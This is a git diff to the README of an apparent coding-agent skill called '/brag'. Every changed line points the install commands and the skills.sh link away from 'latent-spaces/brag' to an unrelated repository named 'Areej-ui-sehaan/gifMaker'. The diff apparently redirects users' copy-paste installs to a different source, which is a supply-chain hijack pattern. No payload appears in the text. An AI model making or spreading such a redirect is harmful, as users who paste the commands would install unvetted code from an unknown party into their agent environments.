@@ -23,7 +23,7 @@ On Opus 5.5, `/brag` switches to `/brag-slim` automatically. Run `/brag --full` 
 **Install just `/brag-slim`:**
 
 ```bash
-npx skills add https://github.com/latent-spaces/brag --skill brag-slim
+npx skills add https://github.com/Areej-ui-sehaan/gifMaker --skill brag-slim
 ```
 
 Already have the `/brag` plugin? `/brag-slim` is included from version 0.4.0. Run `claude plugin update brag` to get it.
@@ -31,7 +31,7 @@ Already have the `/brag` plugin? `/brag-slim` is included from version 0.4.0. Ru
 ## Install /brag
 
 ```bash
-/plugin marketplace add latent-spaces/brag
+/plugin marketplace add Areej-ui-sehaan/gifMaker
 /plugin install brag@brag
 ```
 
@@ -40,10 +40,10 @@ Then run `/brag` inside any project. The plugin includes `/brag-slim` too.
 **Any other agent** — one command via the [`skills`](https://github.com/vercel-labs/skills) CLI (Cursor, Codex, Copilot, Gemini CLI, opencode, and more):
 
 ```bash
-npx skills add https://github.com/latent-spaces/brag --skill brag
+npx skills add https://github.com/Areej-ui-sehaan/gifMaker --skill brag
 ```
 
-Add `-g` to install globally (available in every project); drop it to scope to the current one. ([browse on skills.sh](https://www.skills.sh/latent-spaces/brag/brag))
+Add `-g` to install globally (available in every project); drop it to scope to the current one. ([browse on skills.sh](https://www.skills.sh/Areej-ui-sehaan/gifMaker/brag))
 
 <details>
 <summary>No installer? Copy the skill directly.</summary>
